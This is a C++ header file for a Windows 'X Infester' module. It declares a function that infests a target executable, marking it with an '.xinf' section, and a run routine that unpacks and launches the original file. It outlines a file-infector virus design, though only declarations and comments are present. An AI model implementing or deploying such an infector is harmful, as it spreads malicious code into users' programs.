//////////////////////////////////////////////
//X Infester for windows platform
//language:C++
//Module Codes by DBinary
//2015-10-10 
//////////////////////////////////////////////
#pragma once

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "../../PEStructure/PEStructure.h"

#define XINFESTED_SECTION_STRING ".xinf"


//************************************
// Method:    XInfester_Run
// FullName:  XInfester_Run
// Access:    public 
// Returns:   void
// Qualifier:
// The function should be call in program begin
// it  will free resource file to current path(if the file has been infested.) & CreateProcess for source file
// MakeSure the execution file without parameters 
//************************************
void XInfester_Run();



//************************************
// Method:    XInfester_InfestFile
// FullName:  XInfester_InfestFile
// Access:    public 
// Returns:   BOOL (if succeed return TRUE£¬if failed else FALSE)
// Qualifier:
// Parameter: const char * pDestFileName : The file will be infest
//************************************
BOOL XInfester_InfestFile(const char *pDestFileName);